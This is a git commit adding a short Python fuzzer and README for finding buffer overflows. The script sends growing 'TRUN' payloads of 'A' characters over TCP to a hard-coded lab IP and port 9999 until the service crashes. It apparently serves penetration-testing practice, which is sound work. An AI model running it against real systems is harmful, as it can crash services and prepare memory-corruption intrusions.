1f4e06369d5fdac6772906ae377e154c14b20324
Wambuapeter <peterwambua025@gmail.com>
2023-02-02 16:18:31 +0300

    first commit

---
+++ README.md
@@ -0,0 +1,2 @@
+# BUFFER OVERFLOWS
+This is a script to fuzz a process to see if it is vulnerable to buffer overflows
---
+++ fuzzer.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+    try:
+        payload = "TRUN /.:/" + buffer
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('172.16.98.40',9999)) #change this to the ip you attacking
+        print("[*] Sending the payload[#]...\n" + str(len(buffer)))
+        s.send((payload.encode()))
+        s.close()
+        sleep(1)
+        buffer = buffer + "A"*100
+    except:
+        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
+        sys.exit()
